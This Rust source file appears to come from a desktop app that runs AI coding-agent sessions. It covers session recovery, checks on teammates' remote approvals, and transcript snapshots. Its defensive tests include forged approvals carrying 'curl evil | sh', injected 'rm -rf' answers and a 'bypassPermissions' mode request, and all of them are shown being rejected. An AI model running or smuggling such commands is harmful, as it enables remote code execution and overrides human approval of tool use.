    match account_boundary(state, session)? {
        AccountBoundary::Wait => return Ok(()),
        AccountBoundary::Restart => {
            crate::session::revive(app, state, session)?;
            return Ok(());
        }
        AccountBoundary::Keep => {}
    }
    let up = lock(&state.chats).get(session).is_some_and(|c| c.alive());
    let ready = lock(&state.ready).contains(session);
    match wake(up, ready, setup_running(state, session)) {
        Wake::Revive => {
            crate::session::revive(app, state, session)?;
        }
        // Readiness refers to the input pipe. A live process with a missing marker can be repaired
        // in place; `ready_now` still waits for an active setup.
        Wake::Ready => ready_now(app, session),
        // A ready process with finished setup can send an orphaned queue instead of leaving its
        // spinner active.
        Wake::Send => send_prompt(app, session, None),
        Wake::None => {}
    }
    Ok(())
}

#[derive(Debug, PartialEq)]
enum AccountBoundary {
    Keep,
    Wait,
    Restart,
}

fn boundary(changed: bool, working: bool) -> AccountBoundary {
    match (changed, working) {
        (false, _) => AccountBoundary::Keep,
        (true, true) => AccountBoundary::Wait,
        (true, false) => AccountBoundary::Restart,
    }
}

fn account_boundary(state: &AppState, session: &str) -> Result<AccountBoundary, String> {
    let chats = lock(&state.chats);
    match chats.get(session).filter(|chat| chat.alive()) {
        Some(chat) => Ok(boundary(chat.changing_account()?, chat.working())),
        None => Ok(AccountBoundary::Keep),
    }
}

#[derive(Debug, PartialEq)]
enum Wake {
    None,
    Ready,
    Revive,
    Send,
}

/// Recover queued input: revive a stopped process, restore a missing readiness marker, or wait for
/// setup.
fn wake(up: bool, ready: bool, setup: bool) -> Wake {
    match (up, ready, setup) {
        (false, _, _) => Wake::Revive,
        (true, false, _) => Wake::Ready,
        (true, true, false) => Wake::Send,
        (true, true, true) => Wake::None,
    }
}

/// Send local V1 controls, including approvals, interruption and permission mode changes.
#[tauri::command]
pub fn chat_control(state: State<AppState>, session: String, frame: Value) -> Result<(), String> {
    let gate = input_gate(&session);
    let _input = lock(&gate);
    write(&state, &session, &frame)
}

/// Validate remote controls against an open request in the transcript. Reconstruct original tool
/// input so a modified teammate client cannot change what the owner approved.
#[tauri::command]
pub fn chat_control_remote(
    state: State<AppState>,
    session: String,
    frame: Value,
) -> Result<(), String> {
    let gate = input_gate(&session);
    let _input = lock(&gate);
    let buffer = {
        let chats = lock(&state.chats);
        let chat = chats
            .get(&session)
            .filter(|chat| chat.alive())
            .ok_or_else(|| i18n::t("err.chat.gone"))?;
        let text = lock(&chat.buffer).text.clone();
        text
    };
    let safe = sanitize_remote_control(&buffer, &frame).ok_or_else(|| i18n::t("err.team.bad"))?;
    write(&state, &session, &safe)
}

fn closed_request(command: &Value) -> Option<Value> {
    (command["v"] == 1 && command["type"] == "request.respond").then(|| {
        let outcome = match command["response"]["outcome"].as_str() {
            Some("allow") => "allowed",
            Some("deny") => "denied",
            Some("answer") => "answered",
            _ => "cancelled",
        };
        conversation::event(
            "request.closed",
            conversation::now(),
            json!({ "requestId": command["requestId"], "outcome": outcome }),
        )
    })
}

fn sanitize_remote_control(buffer: &str, frame: &Value) -> Option<Value> {
    match frame.get("type")?.as_str()? {
        "turn.interrupt" if frame["v"] == 1 => Some(json!({ "v": 1, "type": "turn.interrupt" })),
        "request.respond" if frame["v"] == 1 => {
            let id = bounded(frame.get("requestId")?, 128)?;
            let request = request_in(buffer, id)?;
            let response = frame.get("response")?;
            let clean = match (
                request["kind"].as_str()?,
                response.get("outcome")?.as_str()?,
            ) {
                ("approval" | "plan", "allow") => {
                    json!({ "outcome": "allow" })
                }
                ("question", "answer") => {
                    let answers = answers_for(
                        &request["input"],
                        &json!({ "answers": response.get("answers")? }),
                    )?;
                    json!({ "outcome": "answer", "answers": answers["answers"] })
                }
                ("approval" | "plan" | "question", "deny") => json!({
                    "outcome": "deny",
                    "message": response
                        .get("message")
                        .and_then(|value| bounded(value, 4 * 1024))
                        .unwrap_or("Denied by a teammate"),
                }),
                _ => return None,
            };
            Some(json!({
                "v": 1,
                "type": "request.respond",
                "requestId": id,
                "response": clean,
            }))
        }
        // Compatibility with teammates running the previous control format.
        "control_request" => {
            let id = bounded(frame.get("request_id")?, 128)?;
            (frame.pointer("/request/subtype")?.as_str()? == "interrupt").then(|| {
                json!({ "type": "control_request", "request_id": id, "request": { "subtype": "interrupt" } })
            })
        }
        "control_response" => {
            let envelope = frame.get("response")?;
            if envelope.get("subtype")?.as_str()? != "success" {
                return None;
            }
            let id = bounded(envelope.get("request_id")?, 128)?;
            let request = request_in(buffer, id)?;
            let answer = envelope.get("response")?;
            let behavior = answer.get("behavior")?.as_str()?;
            let response = match behavior {
                "allow" => {
                    let input = request.get("input")?.clone();
                    let updated = if request["kind"] == "question" {
                        answers_for(&input, answer.get("updatedInput")?)?
                    } else {
                        input
                    };
                    json!({ "behavior": "allow", "updatedInput": updated })
                }
                "deny" => {
                    let message = answer
                        .get("message")
                        .and_then(|value| bounded(value, 4 * 1024))
                        .unwrap_or("Denied by a teammate");
                    json!({ "behavior": "deny", "message": message })
                }
                _ => return None,
            };
            Some(json!({
                "type": "control_response",
                "response": { "subtype": "success", "request_id": id, "response": response }
            }))
        }
        _ => None,
    }
}

fn bounded(value: &Value, max: usize) -> Option<&str> {
    value
        .as_str()
        .filter(|text| !text.is_empty() && text.len() <= max)
}

fn request_in(buffer: &str, id: &str) -> Option<Value> {
    for line in buffer.lines().rev() {
        let Ok(frame) = serde_json::from_str::<Value>(line) else {
            continue;
        };
        if frame["v"] == 1 && frame["type"] == "request.closed" && frame["requestId"] == id {
            return None;
        }
        if frame["v"] == 1 && frame["type"] == "request.opened" && frame["requestId"] == id {
            return Some(frame);
        }
        if frame["type"] == "control_request"
            && frame["request_id"] == id
            && frame["request"]["subtype"] == "can_use_tool"
        {
            let kind = match frame["request"]["tool_name"].as_str() {
                Some("AskUserQuestion") => "question",
                Some("ExitPlanMode") => "plan",
                _ => "approval",
            };
            return Some(json!({ "kind": kind, "input": frame["request"]["input"] }));
        }
    }
    None
}

fn answers_for(input: &Value, updated: &Value) -> Option<Value> {
    let questions = input.get("questions")?.as_array()?;
    let allowed: Vec<&str> = questions
        .iter()
        .filter_map(|question| question.get("question")?.as_str())
        .collect();
    if allowed.len() != questions.len() || allowed.len() > 32 {
        return None;
    }
    let answers = updated.get("answers")?.as_object()?;
    if answers.len() > allowed.len() {
        return None;
    }
    let mut clean = serde_json::Map::new();
    let mut bytes = 0;
    for (question, value) in answers {
        if !allowed.contains(&question.as_str()) {
            return None;
        }
        let answer = bounded(value, 4 * 1024)?;
        bytes += answer.len();
        if bytes > 32 * 1024 {
            return None;
        }
        clean.insert(question.clone(), Value::String(answer.to_string()));
    }
    if clean.len() != allowed.len() {
        return None;
    }
    let mut out = input.clone();
    out.as_object_mut()?
        .insert("answers".to_string(), Value::Object(clean));
    Some(out)
}

/// Append runtime turn state to the snapshot so replay can settle or resume streaming correctly.
pub(crate) fn snapshot(state: &AppState, session: &str) -> Snapshot {
    let (mut text, seq, busy) = match lock(&state.chats).get(session) {
        Some(chat) => {
            let b = lock(&chat.buffer);
            (
                b.text.clone(),
                b.seq,
                chat.alive() && chat.pump.turn.load(Ordering::Relaxed),
            )
        }
        None => match lock(&state.board)
            .workspace_of(session)
            .map(|w| transcript_of(w, session))
        {
            Some(path) => (Lines::seeded(&path).text, 0, false),
            None => (String::new(), 0, false),
        },
    };
    text.push_str(
        &conversation::event(
            "session.state",
            conversation::now(),
            json!({ "state": if busy { "busy" } else { "ready" } }),
        )
        .to_string(),
    );
    text.push('\n');
    Snapshot { text, seq }
}

/// Normalize historical provider lines at the conversation boundary before exposing them to MCP.
pub(crate) fn canonical_history(text: &str) -> Vec<Value> {
    let mut legacy = claude::Adapter::default();
    text.lines()
        .filter_map(|line| serde_json::from_str::<Value>(line).ok())
        .flat_map(|event| legacy.translate(&event))
        .collect()
}

/// Resolve the native Claude transcript or the app-managed Codex transcript for this conversation.
pub fn transcript_of(ws: &Workspace, session: &str) -> PathBuf {
    match ws
        .launch_of(session, &crate::session::ResolvedTools::default())
        .agent
    {
        crate::state::ProviderId::Codex
        | crate::state::ProviderId::Antigravity
        | crate::state::ProviderId::RetiredGemini => paths::chat_log(session),
        crate::state::ProviderId::Claude => paths::transcript(session, Path::new(&ws.worktree)),
    }
}

/// Capture text and sequence under the same lock used for live delivery. Remote viewers can discard
/// only the events already included in this snapshot.
#[tauri::command]
pub fn chat_snapshot(state: State<AppState>, session: String) -> Snapshot {
    snapshot(&state, &session)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn telemetry_measurements_never_enter_transcripts_or_shared_conversation_lines() {
        let frame = json!({"v":1,"type":"turn.completed","at":1,"outcome":"ok","message":"answer","durationMs":10,"costUsd":null,
            "providerDurationMs":10,"telemetry":{"usage":{"inputTokens":123}}});
        let serialized = frame.to_string();
        let public: Value = serde_json::from_str(&public_text(&serialized, &frame)).unwrap();
        assert!(public.get("telemetry").is_none());
        assert!(public.get("providerDurationMs").is_none());
        assert_eq!(public["message"], "answer");
        assert_eq!(public["durationMs"], 10);
        assert_eq!(frame["telemetry"]["usage"]["inputTokens"], 123);
    }

    #[test]
    fn canonical_mcp_history_excludes_provider_child_transcripts() {
        let canonical = json!({"v":1,"type":"turn.completed","at":10,"outcome":"ok"});
        let text = [
            json!({"type":"user","message":{"role":"user","content":"main conversation"}}),
            json!({"type":"user","isSidechain":true,"message":{"role":"user","content":"private child"}}),
            canonical.clone(),
        ].iter().map(Value::to_string).collect::<Vec<_>>().join("\n");
        let history = canonical_history(&text);
        assert_eq!(history.len(), 2);
        assert_eq!(history[0]["type"], "user.message");
        assert_eq!(history[1], canonical);
        assert!(!serde_json::to_string(&history)
            .unwrap()
            .contains("private child"));
    }

    #[test]
    fn command_records_busy_user_and_echo_before_concurrent_response() {
        let lines = Mutex::new(Lines::default());
        let emitted = Mutex::new(Vec::new());
        let directory =
            std::env::temp_dir().join(format!("prometeu-chat-{}", uuid::Uuid::new_v4()));
        let log = directory.join("chat.jsonl");
        let (sent, sent_rx) = std::sync::mpsc::channel();
        let (blocked, blocked_rx) = std::sync::mpsc::channel();
        std::thread::scope(|scope| {
            let (lines, emitted, log) = (&lines, &emitted, &log);
            scope.spawn(move || {
                sent_rx.recv_timeout(Duration::from_secs(2)).unwrap();
                assert!(lines.try_lock().is_err());
                blocked.send(()).unwrap();
                let response = json!({ "v": 1, "type": "assistant.block" }).to_string();
                lock(lines).deliver(&response, true, Some(log), |seq| {
                    lock(emitted).push((seq, "assistant.block".to_string()));
                });
            });
            lock(lines)
                .command(
                    &json!({ "v": 1, "type": "message.send", "text": "hello" }),
                    |buffer| {
                        assert!(buffer.is_empty());
                        sent.send(()).unwrap();
                        blocked_rx.recv_timeout(Duration::from_secs(2)).unwrap();
                        Ok(vec![json!({ "v": 1, "type": "system.notice" })])
                    },
                    |lines, event| {
                        if event["type"] == "session.state" {
                            assert_eq!(event["v"], 1);
                            assert_eq!(event["state"], "busy");
                            assert!(event["at"].is_u64());
                        }
                        lines.deliver(&event.to_string(), keep(event), Some(log), |seq| {
                            lock(emitted).push((seq, event["type"].as_str().unwrap().to_string()));
                        });
                    },
                )
                .unwrap();
        });
        assert_eq!(
            *lock(&emitted),
            [
                (1, "session.state".into()),
                (2, "user.message".into()),
                (3, "system.notice".into()),
                (4, "assistant.block".into()),
            ]
        );
        assert_eq!(std::fs::read_to_string(&log).unwrap(), lock(&lines).text);
        assert!(!lock(&lines).text.contains("session.state"));
        std::fs::remove_dir_all(directory).unwrap();
    }

    #[test]
    fn large_command_drains_output_before_publishing_the_response() {
        use std::os::unix::net::UnixStream;

        let (input, mut child) = UnixStream::pair().unwrap();
        for stream in [&input, &child] {
            stream
                .set_read_timeout(Some(Duration::from_secs(5)))
                .unwrap();
            stream
                .set_write_timeout(Some(Duration::from_secs(5)))
                .unwrap();
        }
        let mut stdin = input.try_clone().unwrap();
        let output = output_lines(input);
        let lines = Mutex::new(Lines::default());
        let emitted = Mutex::new(Vec::new());
        let command = json!({ "v": 1, "type": "message.send", "text": "x".repeat(1024 * 1024) });
        let (blocked, blocked_rx) = std::sync::mpsc::channel();
        std::thread::scope(|scope| {
            let mut pending = lock(&lines);
            let (lines, emitted) = (&lines, &emitted);
            let provider = scope.spawn(move || {
                let delta = json!({ "type": "assistant.delta", "text": "y".repeat(8192) });
                let delta = format!("{delta}\n");
                // More output than the socket can hold, before reading the large command.
                for _ in 0..256 {
                    child.write_all(delta.as_bytes())?;
                }
                let mut received = String::new();
                BufReader::new(child.try_clone()?).read_line(&mut received)?;
                let received: Value = serde_json::from_str(&received).unwrap();
                assert_eq!(received["text"].as_str().unwrap().len(), 1024 * 1024);
                child.write_all(b"{\"type\":\"turn.completed\"}\n")
            });
            let incoming = scope.spawn(move || {
                let mut blocked = Some(blocked);
                for text in output {
                    if let Some(blocked) = blocked.take() {
                        assert!(lines.try_lock().is_err());
                        blocked.send(()).unwrap();
                    }
                    let frame: Value = serde_json::from_str(&text).unwrap();
                    lock(lines).deliver(&text, keep(&frame), None, |seq| {
                        lock(emitted).push((seq, frame["type"].as_str().unwrap().to_string()));
                    });
                }
            });
            let sent = pending.command(
                &command,
                |_| {
                    blocked_rx.recv_timeout(Duration::from_secs(5)).unwrap();
                    stdin
                        .write_all(format!("{command}\n").as_bytes())
                        .map_err(|error| error.to_string())?;
                    Ok(vec![])
                },
                |lines, event| {
                    lines.deliver(&event.to_string(), keep(event), None, |seq| {
                        lock(emitted).push((seq, event["type"].as_str().unwrap().to_string()));
                    });
                },
            );
            drop(pending);
            drop(stdin);
            provider.join().unwrap().unwrap();
            incoming.join().unwrap();
            sent.unwrap();
        });
        let emitted = lock(&emitted);
        assert_eq!(emitted.len(), 259);
        assert_eq!(emitted[0], (1, "session.state".into()));
        assert_eq!(emitted[1], (2, "user.message".into()));
        assert_eq!(emitted[258], (259, "turn.completed".into()));
        assert!(emitted
            .iter()
            .enumerate()
            .all(|(index, (seq, _))| *seq == index as u64 + 1));
        let lines = lock(&lines);
        assert_eq!(lines.seq, 259);
        assert_eq!(lines.text.lines().count(), 2);
    }

    #[test]
    fn failed_command_does_not_record_busy_or_user_message() {
        let mut lines = Lines::default();
        let error = lines.command(
            &json!({ "v": 1, "type": "message.send", "text": "retry me" }),
            |_| Err("broken pipe".to_string()),
            |_, _| panic!("failed commands must not emit"),
        );
        assert_eq!(error.unwrap_err(), "broken pipe");
        assert!(lines.text.is_empty());
        assert_eq!(lines.seq, 0);
    }

    #[test]
    fn answering_a_request_does_not_start_another_notification_cycle() {
        let mut lines = Lines::default();
        let events = lines
            .command(
                &json!({
                    "v": 1,
                    "type": "request.respond",
                    "requestId": "ask-1",
                    "response": { "outcome": "allow" },
                }),
                |_| Ok(vec![]),
                |lines, event| {
                    lines.deliver(&event.to_string(), keep(event), None, |_| {});
                },
            )
            .unwrap();
        assert_eq!(events.len(), 1);
        assert_eq!(events[0]["type"], "request.closed");
        assert_eq!(lines.seq, 1);
    }

    /// Caller-supplied environment values, including MCP secrets, survive inherited Claude-variable
    /// cleanup.
    #[test]
    fn caller_environment_reaches_the_process() {
        std::env::set_var("CLAUDE_CODE_CHILD_SESSION", "1");
        let mut cmd = Command::new("sh");
        cmd.arg("-c")
            .arg(r#"printf '%s|%s' "$PROMETEU_MCP_X_AUTHORIZATION" "$CLAUDE_CODE_CHILD_SESSION""#);
        cmd.env("PROMETEU_MCP_X_AUTHORIZATION", "Bearer abracadabra");
        drop_claude_vars(&mut cmd);
        let out = cmd.output().expect("shell");
        std::env::remove_var("CLAUDE_CODE_CHILD_SESSION");
        assert_eq!(String::from_utf8_lossy(&out.stdout), "Bearer abracadabra|");
    }

    #[test]
    fn old_completion_does_not_close_the_replacement_process() {
        let old = Arc::new(AtomicBool::new(false));
        let new = Arc::new(AtomicBool::new(true));

        assert!(same_process(Some(&old), &old));
        assert!(!same_process(Some(&new), &old));
        assert!(!same_process(None, &old));
    }

    #[test]
    fn orphaned_pending_input_reopens_or_reconnects_the_conversation() {
        assert_eq!(wake(false, false, false), Wake::Revive);
        assert_eq!(wake(false, true, false), Wake::Revive);
        assert_eq!(wake(true, false, false), Wake::Ready);
        assert_eq!(wake(true, true, false), Wake::Send);
        assert_eq!(wake(true, true, true), Wake::None);
    }

    /// Persisted and ephemeral events share one increasing sequence so snapshots and live delivery
    /// agree.
    #[test]
    fn numbers_lines_whether_retained_or_not() {
        let mut l = Lines::default();
        assert_eq!(l.absorb("a"), 1);
        assert_eq!(l.skip(), 2);
        assert_eq!(l.absorb("b"), 3);
        assert_eq!(l.text, "a\nb\n");
    }

    /// Trim whole JSON lines instead of keeping an invalid partial record.
    #[test]
    fn retention_limit_drops_whole_lines() {
        let mut l = Lines::default();
        let fat = "x".repeat(KEEP);
        l.absorb(&fat);
        l.absorb("fim");
        assert_eq!(l.text, "fim\n");
        assert_eq!(l.seq, 2);
    }

    /// Keep replayable messages, tools, requests and completion; discard streaming and progress
    /// noise.
    #[test]
    fn retains_the_data_needed_to_restore_the_view() {
        let f = |s: &str| serde_json::from_str::<Value>(s).unwrap();
        assert!(keep(&f(r#"{"v":1,"type":"assistant.block"}"#)));
        assert!(keep(&f(r#"{"v":1,"type":"user.message"}"#)));
        assert!(keep(&f(r#"{"v":1,"type":"tool.completed"}"#)));
        assert!(keep(&f(r#"{"v":1,"type":"request.opened"}"#)));
        assert!(keep(&f(r#"{"v":1,"type":"turn.completed"}"#)));
        assert!(keep(&f(r#"{"v":1,"type":"context.compacted"}"#)));
        assert!(keep(&f(r#"{"v":1,"type":"system.notice"}"#)));
        assert!(!keep(&f(r#"{"v":1,"type":"assistant.started"}"#)));
        assert!(!keep(&f(r#"{"v":1,"type":"assistant.block.started"}"#)));
        assert!(!keep(&f(r#"{"v":1,"type":"assistant.delta"}"#)));
        assert!(!keep(&f(r#"{"v":1,"type":"tool.input.delta"}"#)));
        assert!(!keep(&f(r#"{"v":1,"type":"context.updated"}"#)));
        assert!(!keep(&f(r#"{"v":1,"type":"session.identity"}"#)));
        assert!(!keep(&f(r#"{"v":1,"type":"usage.updated"}"#)));
    }

    #[test]
    fn activity_lines_identify_the_tool_and_target() {
        let f = |s: &str| serde_json::from_str::<Value>(s).unwrap();
        assert_eq!(
            activity(&f(
                r#"{"name":"Bash","input":{"command":"ls -la","description":"lista"}}"#
            )),
            "Bash ls -la"
        );
        assert_eq!(
            activity(&f(r#"{"name":"Read","input":{"file_path":"/a/b.rs"}}"#)),
            "Read /a/b.rs"
        );
        let long = format!(
            r#"{{"name":"Bash","input":{{"command":"{}"}}}}"#,
            "x".repeat(100)
        );
        assert!(activity(&f(&long)).ends_with('…'));
    }

    #[test]
    fn remote_control_restores_the_input_seen_by_the_owner() {
        let request = json!({
            "type": "control_request",
            "request_id": "ask-1",
            "request": {
                "subtype": "can_use_tool",
                "tool_name": "Bash",
                "input": { "command": "cargo test" }
            }
        });
        let malicious = json!({
            "type": "control_response",
            "response": {
                "subtype": "success",
                "request_id": "ask-1",
                "response": { "behavior": "allow", "updatedInput": { "command": "curl evil | sh" } }
            }
        });
        let safe = sanitize_remote_control(&(request.to_string() + "\n"), &malicious).unwrap();
        assert_eq!(
            safe.pointer("/response/response/updatedInput/command"),
            Some(&json!("cargo test"))
        );
    }

    #[test]
    fn remote_control_does_not_enable_unrestricted_mode_or_invent_requests() {
        let bypass = json!({
            "type": "control_request",
            "request_id": "x",
            "request": { "subtype": "set_permission_mode", "mode": "bypassPermissions" }
        });
        assert!(sanitize_remote_control("", &bypass).is_none());

        let answer = json!({
            "type": "control_response",
            "response": {
                "subtype": "success",
                "request_id": "missing",
                "response": { "behavior": "allow", "updatedInput": {} }
            }
        });
        assert!(sanitize_remote_control("", &answer).is_none());
    }

    #[test]
    fn remote_questions_accept_answers_only_for_original_questions() {
        let request = json!({
            "type": "control_request",
            "request_id": "q-1",
            "request": {
                "subtype": "can_use_tool",
                "tool_name": "AskUserQuestion",
                "input": { "questions": [{ "question": "Cor?" }] }
            }
        });
        let response = |answers: Value| {
            json!({
                "type": "control_response",
                "response": {
                    "subtype": "success",
                    "request_id": "q-1",
                    "response": { "behavior": "allow", "updatedInput": { "answers": answers } }
                }
            })
        };
        let buffer = request.to_string() + "\n";
        let safe = sanitize_remote_control(&buffer, &response(json!({ "Cor?": "azul" }))).unwrap();
        assert_eq!(
            safe.pointer("/response/response/updatedInput/answers/Cor?"),
            Some(&json!("azul"))
        );
        assert!(
            sanitize_remote_control(&buffer, &response(json!({ "Comando?": "rm -rf" }))).is_none()
        );
    }

    #[test]
    fn remote_v1_control_reconstructs_responses_without_trusting_the_client() {
        let request = conversation::event(
            "request.opened",
            1,
            json!({
                "requestId": "ask-v1",
                "kind": "question",
                "toolId": "tool-v1",
                "tool": "AskUserQuestion",
                "input": { "questions": [{ "question": "Cor?" }] },
            }),
        );
        let answer = json!({
            "v": 1,
            "type": "request.respond",
            "requestId": "ask-v1",
            "response": { "outcome": "answer", "answers": { "Cor?": "azul" } },
        });
        let safe = sanitize_remote_control(&(request.to_string() + "\n"), &answer).unwrap();
        assert_eq!(safe["response"]["answers"]["Cor?"], "azul");

        let invented = json!({
            "v": 1,
            "type": "request.respond",
            "requestId": "ask-v1",
            "response": { "outcome": "answer", "answers": { "Comando?": "rm -rf" } },
        });
        assert!(sanitize_remote_control(&(request.to_string() + "\n"), &invented).is_none());
        assert!(sanitize_remote_control(
            "",
            &json!({ "v": 1, "type": "permission.mode.set", "mode": "bypass" })
        )
        .is_none());
    }

    #[test]
    fn remote_responses_follow_canonical_kind_not_tool_name() {
        for (kind, tool) in [
            ("question", json!("custom_question")),
            ("question", Value::Null),
            ("approval", json!("AskUserQuestion")),
            ("plan", json!("AskUserQuestion")),
        ] {
            let buffer = conversation::event(
                "request.opened",
                1,
                json!({
                    "requestId": "ask", "kind": kind, "tool": tool, "toolId": null,
                    "input": { "questions": [{ "question": "Color?" }] },
                }),
            )
            .to_string();
            let respond = |response: Value| json!({ "v": 1, "type": "request.respond", "requestId": "ask", "response": response });
            let answer = respond(json!({ "outcome": "answer", "answers": { "Color?": "blue" } }));
            let allow = respond(json!({ "outcome": "allow" }));
            if kind == "question" {
                assert_eq!(
                    sanitize_remote_control(&buffer, &answer),
                    Some(answer.clone())
                );
                assert!(sanitize_remote_control(&buffer, &allow).is_none());
                let invented =
                    respond(json!({ "outcome": "answer", "answers": { "Command?": "evil" } }));
                assert!(sanitize_remote_control(&buffer, &invented).is_none());
                let mut malicious = answer.clone();
                malicious["response"]["updatedInput"] = json!({ "command": "evil" });
                malicious["command"] = json!("evil");
                assert_eq!(sanitize_remote_control(&buffer, &malicious), Some(answer));
            } else {
                assert_eq!(sanitize_remote_control(&buffer, &allow), Some(allow));
                assert!(sanitize_remote_control(&buffer, &answer).is_none());
            }
            let deny = respond(json!({ "outcome": "deny", "message": "No" }));
            assert_eq!(sanitize_remote_control(&buffer, &deny), Some(deny));

            // Older teammates still send the legacy envelope against canonical requests.
            let legacy = json!({
                "type": "control_response", "response": {
                    "subtype": "success", "request_id": "ask", "response": {
                        "behavior": "allow", "updatedInput": {
                            "answers": { "Color?": "blue" }, "command": "evil"
                        }
                    }
                }
            });
            let safe = sanitize_remote_control(&buffer, &legacy).unwrap();
            let input = &safe["response"]["response"]["updatedInput"];
            assert!(input.get("command").is_none());
            assert_eq!(input["questions"][0]["question"], "Color?");
            assert_eq!(input.get("answers").is_some(), kind == "question");
        }
    }
}

#[cfg(test)]
mod work_tests {
    use super::*;

    #[test]
    fn a_turn_settles_only_after_its_background_tasks_drain() {
        let mut work = Work::default();
        assert!(!work.reported(1));
        assert!(!work.ended());
        assert!(!work.reported(2));
        assert!(!work.reported(1));
        assert!(work.reported(0));
        // The drain is consumed: a repeated empty report does not settle a second time.
        assert!(!work.reported(0));
    }

    #[test]
    fn a_turn_without_background_tasks_settles_immediately() {
        let mut work = Work::default();
        assert!(work.ended());
        assert!(!work.reported(0));
        // A task started by a later continuation settles with that continuation's own terminal.
        assert!(!work.reported(1));
        assert!(!work.reported(0));
        assert!(work.ended());
    }

    #[test]
    fn an_interruption_settles_without_waiting_for_a_reported_drain() {
        let mut work = Work::default();
        assert!(!work.observe(&json!({"type":"background.changed","tasks":[{"id":"child"}]})));
        assert!(work.observe(&json!({"type":"turn.completed","outcome":"interrupted"})));
        assert!(work.observe(&json!({"type":"turn.completed","outcome":"ok"})));
    }

    #[test]
    fn a_resumed_turn_drops_the_completion_its_tasks_were_holding() {
        let mut work = Work::default();
        assert!(!work.observe(&json!({"type":"background.changed","tasks":[{"id":"child"}]})));
        assert!(!work.observe(&json!({"type":"turn.completed","outcome":"ok"})));
        // The main agent answers again before the child finishes.
        assert!(!work.observe(&json!({"type":"assistant.started","messageId":"m"})));
        assert!(
            !work.observe(&json!({"type":"background.changed","tasks":[]})),
            "a drain must not settle a resumed turn"
        );
        assert!(work.observe(&json!({"type":"turn.completed","outcome":"ok"})));
    }

    #[test]
    fn a_conversation_owes_work_while_its_tasks_run() {
        let mut work = Work::default();
        assert!(!work.busy());
        work.observe(&json!({"type":"background.changed","tasks":[{"id":"child"}]}));
        assert!(work.busy());
        work.observe(&json!({"type":"turn.completed","outcome":"ok"}));
        assert!(work.busy(), "a held completion still owes its children");
        work.observe(&json!({"type":"background.changed","tasks":[]}));
        assert!(!work.busy());
    }

    #[test]
    fn only_the_turn_and_its_tasks_move_the_conversation() {
        let mut work = Work::default();
        for event in [
            json!({"type":"assistant.block","block":{"kind":"text"}}),
            json!({"type":"request.opened","requestId":"q"}),
            json!({"type":"context.updated","used":10}),
        ] {
            assert!(!work.observe(&event));
        }
        assert!(work.observe(&json!({"type":"turn.completed","outcome":"ok"})));
    }

    #[test]
    fn draining_without_a_finished_turn_does_not_settle() {
        let mut work = Work::default();
        assert!(!work.reported(1));
        assert!(!work.reported(0));
        assert!(work.ended());
    }
}

#[cfg(test)]
mod account_tests {
    use super::*;

    #[test]
    fn switching_waits_for_the_current_turn_and_resumes_before_the_next_input() {
        assert_eq!(boundary(false, true), AccountBoundary::Keep);
        assert_eq!(boundary(false, false), AccountBoundary::Keep);
        assert_eq!(boundary(true, true), AccountBoundary::Wait);
        assert_eq!(boundary(true, false), AccountBoundary::Restart);
    }
}
